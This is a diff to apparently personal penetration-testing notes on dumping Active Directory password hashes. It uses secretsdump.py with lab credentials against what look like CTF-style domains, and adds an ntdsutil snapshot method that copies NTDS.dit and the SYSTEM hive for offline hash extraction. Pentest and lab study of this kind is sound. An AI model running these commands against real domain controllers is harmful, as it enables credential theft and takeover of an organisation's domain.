@@ -83,12 +83,44 @@ evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
 ````
 ### Dump hashes
 - Use `secretsdump.py` with impacket
-- This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer.
+- This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. 
+- Creds used need to be domain admin for this to work 
 ````
 python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15
 python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.248.93
+secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ````
 ![spooky](https://user-images.githubusercontent.com/75596877/130284812-511a8141-5917-4954-8c29-e623c1edce36.png)
+#### Alt Method 
+- Open `cmd.exe`
+- Run `ntdsutil` from the command prompt, enter these commands 
+````
+snapshot
+activate instance NTDS
+create
+````
+- Takes a snapshot of the DC 
+- Will show you the UUID of the newly created snapshot. 
+- ntdsutil is using Volume Shadow Copy for the snapshot creation, but also ensures the database consistency. Use the UUID for the following command:
+````
+mount <UUID>
+````
+- The output will show the path where the snapshot was mounted. Start another cmd.exe as Administrator and copy NTDS.dit (located in `Windows\NTDS\NTDS.dit` by default).
+- Create a copy of the `SYSTEM` registry hive:
+````
+reg.exe save HKLM\SYSTEM <path_where_you_want_to_save_it>
+````
+- Go back to the `cmd.exe` window with `ntdsutil` running, and `unmount` (and optionally `delete`) the snapshot and exit:
+````
+unmount <UUID>
+delete <UUID>
+quit
+quit
+````
+- Using the two saved files (`NTDS.dit` and `SYSTEM` registry hive) you can use the same `secretsdump.py` script to extract password hashes offline (doesn’t need to be done on the domain controller):
+````
+secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
+````
 #### Secretsdump Local 
 - Exfil the registry hives 
 ````
